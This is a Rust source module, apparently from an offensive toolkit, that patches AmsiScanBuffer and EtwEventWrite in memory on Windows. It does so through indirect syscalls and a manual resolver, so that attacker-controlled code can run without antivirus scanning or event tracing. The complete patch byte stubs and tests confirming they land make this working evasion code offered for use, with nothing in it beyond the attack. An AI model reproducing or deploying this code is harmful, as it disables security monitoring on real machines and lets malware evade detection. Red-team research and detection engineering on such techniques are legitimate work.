//! In-process AMSI and ETW patching (ABR-T024): before executing
//! attacker-controlled managed code, the two instrumentation layers a
//! default Windows 11 build offers in every process are neutralized for
//! THIS process only — no kernel object, no cross-process write.
//!
//! - `amsi.dll!AmsiScanBuffer` → `mov eax, 0x80070057 ; ret`
//!   (E_INVALIDARG: every scan reports "invalid argument" and succeeds).
//! - `ntdll!EtwEventWrite` → `xor eax, eax ; ret` (events swallow).
//!
//! Both patches flip the target page RW through the indirect-syscall
//! layer, write through volatile stores, read back byte-exact and
//! restore the original protection. Loading `amsi.dll` on demand is
//! itself telemetry-free (LoadLibraryA through the manual resolver,
//! no IAT entry).

use super::syscalls;

const PAGE_READWRITE: usize = 0x04;

/// Patches `AmsiScanBuffer` and returns the patched address. Safe to
/// call repeatedly (idempotent once the stub is in place).
pub fn patch_amsi() -> Result<usize, String> {
    let addr = unsafe { super::syscalls::export_address("amsi.dll", "AmsiScanBuffer") }
        .ok_or("AmsiScanBuffer unresolved")?;
    // mov eax, 0x80070057 ; ret — scans return E_INVALIDARG.
    patch_bytes(addr, &[0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3], "amsi")?;
    Ok(addr)
}

/// Patches `EtwEventWrite` and returns the patched address.
pub fn patch_etw() -> Result<usize, String> {
    let addr = unsafe { super::syscalls::export_address("ntdll.dll", "EtwEventWrite") }
        .ok_or("EtwEventWrite unresolved")?;
    // xor eax, eax ; ret — every event write reports success and drops.
    patch_bytes(addr, &[0x31, 0xC0, 0xC3], "etw")?;
    Ok(addr)
}

fn patch_bytes(addr: usize, stub: &[u8], name: &str) -> Result<(), String> {
    let original = unsafe { syscalls::protect(addr, stub.len(), PAGE_READWRITE) }
        .ok_or_else(|| format!("{name}: RW protect failed"))?;
    for (i, byte) in stub.iter().enumerate() {
        unsafe { std::ptr::write_volatile((addr + i) as *mut u8, *byte) };
    }
    let ok = stub
        .iter()
        .enumerate()
        .all(|(i, byte)| (unsafe { std::ptr::read_volatile((addr + i) as *const u8) }) == *byte);
    // Restore the page's original protection (RX inside the module).
    unsafe { syscalls::protect(addr, stub.len(), original as usize) };
    if !ok {
        return Err(format!("{name}: readback mismatch"));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[ignore = "rewires global process instrumentation; run with --test-threads=1"]
    fn amsi_patch_lands_and_is_idempotent() {
        let addr = patch_amsi().expect("amsi patch");
        assert_ne!(addr, 0);
        // Second application must succeed on the already-patched stub.
        patch_amsi().expect("amsi patch idempotent");
        let bytes: [u8; 6] = unsafe { std::ptr::read_volatile(addr as *const [u8; 6]) };
        assert_eq!(bytes, [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]);
    }

    #[test]
    #[ignore = "rewires global process instrumentation; run with --test-threads=1"]
    fn etw_patch_lands() {
        let addr = patch_etw().expect("etw patch");
        let bytes: [u8; 3] = unsafe { std::ptr::read_volatile(addr as *const [u8; 3]) };
        assert_eq!(bytes, [0x31, 0xC0, 0xC3]);
    }
}
